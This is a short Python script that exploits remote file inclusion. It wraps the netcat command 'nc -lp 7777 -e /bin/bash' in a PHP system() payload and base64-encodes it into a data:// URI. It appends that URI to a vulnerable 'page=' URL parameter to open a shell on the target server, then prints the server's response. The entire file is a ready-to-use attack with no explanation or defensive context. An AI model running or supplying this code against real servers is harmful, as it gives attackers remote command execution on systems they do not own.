import requests
import sys

# url parameter with a RFI vulnerable
# example http://w.com/fi/?page=
url = ("")

# netcat, port 7777

command = """nc -lp 7777 -e /bin/bash &"""
cod = """<?php system('%s'); ?>""" % command

# by base64

codeb64 = cod.encode('base64')
dataw = """data://text/plain;base64,""" +str(codeb64)

destiny = url + dataw

r = requests.get(destiny)
print (r.status_code)
print (r.headers)
print (r.content)



